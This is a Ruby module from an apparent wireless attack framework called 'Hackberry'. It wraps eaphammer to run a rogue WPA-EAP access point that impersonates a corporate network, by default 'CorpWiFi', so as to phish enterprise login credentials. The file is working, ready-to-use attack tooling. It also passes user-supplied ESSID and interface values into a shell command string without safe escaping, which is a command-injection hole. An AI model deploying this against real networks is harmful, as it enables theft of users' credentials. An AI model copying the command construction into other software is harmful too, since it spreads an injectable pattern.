# modules/wifi/eaphammer.rb
require_relative '../../core/module_base'
require_relative '../../core/exec'
require_relative '../../core/registry'

module Hackberry
  class Eaphammer < ModuleBase
    def self.id; 'wifi_eaphammer'; end
    def self.category; :wifi; end
    def self.label; 'EAPHammer (WPA‑EAP Rogue)'; end
    def self.icon; '📶'; end

    def self.actions
      [
        { id:'eap', label:'WPA‑EAP Rogue', description:'Phish EAP creds',
          inputs:[
            {name:'iface', label:'Wi‑Fi iface', type:'select', options:[] , placeholder:'wlan0'},
            {name:'essid', label:'ESSID', type:'text', default:'CorpWiFi'},
            {name:'channel', label:'Channel', type:'number', default:'6'}
          ] }
      ]
    end

    def self.run(action_id, p, cfg)
      iface = p['iface'].to_s.empty? ? cfg['interfaces']['wifi'] : p['iface']
      essid = p['essid']
      ch    = (p['channel'] || '6').to_i
      log = File.join(cfg['paths']['logs'], "eaphammer-#{Hackberry::Exec.timestamp}.log")
      cmd = "eaphammer --interface #{iface} --channel #{ch} --auth wpa-eap --essid '#{essid}' --creds"
      Hackberry::Exec.tmux_run(name:'eaphammer', cmd: cmd, log_path: log)
    end
  end
end

Hackberry::Registry.register(Hackberry::Eaphammer)
